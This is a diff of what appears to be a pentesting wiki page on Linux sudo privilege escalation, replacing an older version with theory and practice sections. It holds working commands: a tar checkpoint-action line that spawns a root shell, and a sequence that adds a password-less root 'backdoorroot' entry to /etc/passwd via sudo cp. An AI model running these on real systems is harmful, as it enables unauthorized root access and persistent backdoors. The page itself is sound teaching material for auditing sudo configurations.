@@ -1,63 +1,76 @@
-# 🛠️ Sudo configuration
+# 🛠️ SUDO
 
-## List a user's available sudo commands
-
-```bash
-# List sudo commands
-sudo  -l
-
-User user123 may run the following commands on machineN4me:
-    (ALL) ALL
-```
-
-{% hint style="info" %}
-It might seem obvious, but a user `user1` with "ALL" sudo permissions doesn't need to know the `root` password to get a `root` shell. Just run `sudo -i`, `sudo -s` or even `sudo su` to drop in an interactive root shell with `user1`'s password. This is mitigated when there is a command whitelist. 
+{% hint style="danger" %}
+**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
 {% endhint %}
 
-## sudoers file
+## Theory
 
-Access the sudo configuration running the `visudo` command as root. This will open `/etc/sudoers`.
+`sudo` \(Super User DO\) is a program for UNIX-like computer operating systems that allows users to run programs with the security privileges of another user \(by default, the superuser\).
 
-We can see several interesting lines :
+Unlike the similar command `su`, users must, by default, supply their own password for authentication, rather than the password of the target user. After authentication, and if the configuration file, which is typically located at `/etc/sudoers`, permits the user access, the system invokes the requested command with the target user's privileges.
 
+Sudo users are called sudoers \( 😯_I know right_🧠 \). What sudoers are allowed to do is defined in the `/etc/sudoers` configuration file. This file, owned by `root`, is supposed to be 440 \(read-only\) and should only be edited with `visudo`, `sudoedit` or `sudo -e`.
+
+![](../../../.gitbook/assets/sudoers_config.png)
+
+## Practice
+
+There are many ways to escalate privileges by exploiting `sudo`, either by profiting from insecure misconfiguration, or by exploiting the program's vulnerabilities.
+
+### Configuration
+
+#### Default permissions
+
+The `sudo -l` command can be run by sudoers to check their sudo rights. The output reflects the `/etc/sudoers` configuration that applies to the user. It should like the following \(default config for a new sudoer\).
+
+```bash
+# Format is
+User johnthesudoer may run the following commands on johncomputer:
+    (ALL : ALL) ALL
 ```
-# Allow root to execute any command, on any system.
-root ALL = (ALL:ALL) ALL
-···
-# Allow users in sudo group to execute any command, on any system.
-%sudo ALL = (ALL:ALL) ALL
+
+For instance, this configuration allows the `johnthesudoer` user to run any privileged command as long as `johnthesudoer`'s password is known. A privileged session can be obtained with `sudo -i`, `sudo -s`, `sudo su` or `sudo <program>`.
+
+#### Living off the land
+
+While, the configuration can be hardened to restrict privileged execution to specific program, there are some that can be abused to bypass local security restrictions. This is called [Living off the land](living-off-the-land.md).
+
+```bash
+User johnthesudoer may run the following commands on johncomputer:
+    (ALL : ALL) /bin/tar
 ```
 
-The sudo configuration lines take the form : 
+The configuration above only allows sudoer `johnthesudoer` to execute `/bin/tar` as root as long as `johnthesudoer`'s password is known. The thing is tar is program that can be used to obtain a full session, hence bypassing the restrictions induced by sudoers configuration.
+
+```bash
+sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
-user MACHINE = (USERS THAT CAN BE IMPERSONATED) COMMANDS
+
+Other examples can be found on the [Living off the land](living-off-the-land.md) note.
+
+#### Escalation tricks
+
+While some programs can be used to obtain a full shell, others can be used to induce changes on the system to grant root privileges, like `/usr/bin/cp`. The following commands are used to edit the `/etc/passwd` file to add a password-less user with `root`'s uid and gid.
+
+```bash
+cp /etc/passwd /tmp/passwd.bak
+echo "backdoorroot::0:0:Backdoor root:/root:/bin/bash" >> /tmp/passwd.bak
+sudo /usr/bin/cp passwd.bak /etc/passwd
+su -l backdoorroot
 ```
-* user : the user to which these restrictions apply
-* MACHINE : usually ALL, name of the system to which these restrictions apply
-* (USERS..) : the users that `user` will be able to take the rights from
-* optional : `NOPASSWD:`, self-explanatory
-* COMMANDS : allowed commands (ex : ALL, or /usr/bin/ls)
 
+### Vulnerabilities
 
-### Bypassing restrictions
-Depending on the allowed commands, restrictions can be bypassed pretty easily. Suppose a user allowed to only use the `cp` command with sudo.
+#### CVE-2019-14287
 
-![](../../../.gitbook/assets/cp_sudo.png)
-![](../../../.gitbook/assets/copysudo_group.png)
-![](../../../.gitbook/assets/cannot_su.png)
+//TODO
 
-This already makes possible privilege escalation, as we can copy any file to arbitrary location. We can for example modify /etc/passwd so that the root account doesn't have a password anymore...
+#### CVE-2021-3156
 
-We first use our `sudo cp` to copy `/etc/passwd` to a nice location, and make a copy that we own in order to modify it.
-![](../../../.gitbook/assets/get_passwd.png)
-![](../../../.gitbook/assets/get_passwd_2.png)
+//TODO
 
-We can then just edit the `x` on the root line, to indicate that the account doesn't need any password.
-![](../../../.gitbook/assets/root_with_pass.png)
-![](../../../.gitbook/assets/root_without_pass.png)
+## References
 
-And we can see that we are not prompted to insert the password anymore.
-![](../../../.gitbook/assets/get_root.png)
+{% embed url="https://gtfobins.github.io/\#+sudo" caption="" %}
 
-{% embed url="https://www.malekal.com/sudo-comment-utiliser-configurer-sudoers-linux/" %}
-{% embed url="https://gtfobins.github.io/#+sudo" %}
